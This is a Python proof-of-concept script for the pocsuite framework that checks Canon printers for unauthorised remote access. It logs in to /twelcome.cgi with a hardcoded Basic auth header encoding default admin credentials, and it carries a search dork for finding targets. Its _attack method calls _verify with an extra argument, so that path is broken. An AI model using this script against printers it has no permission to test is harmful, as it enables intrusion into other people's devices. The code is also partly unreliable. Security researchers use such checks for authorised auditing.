#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register


class TestPOC(POCBase):
    name = "printer_canon_unauth"
    vulID = ''
    author = ['sebao']
    vulType = 'Auth Bypass'
    version = '1.0'  # default version: 1.0
    references = 'http://www.wooyun.org/bugs/WooYun-2015-114364'
    desc = '佳能打印机未授权可远程打印。'


    vulDate = ''
    createDate = '2017-12-22'
    updateDate = '2017-12-22'

    appName = 'canon'
    appVersion = ''
    dork="canon"
    appPowerLink = ''
    samples = []

    def _attack(self):

        return self._verify(self)

    def _verify(self):
        '''verify mode'''
        result = {}

        headers = {
            "Authorization": "Basic MTExMTE6eC1hZG1pbg==",
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/twelcome.cgi"

        vulnurl = self.url + payload
        resp = req.get(vulnurl, headers=headers, timeout=10, verify=False)
        if r"media/b_ok.gif" in resp.content and r"_top.htm" in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vulnurl
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
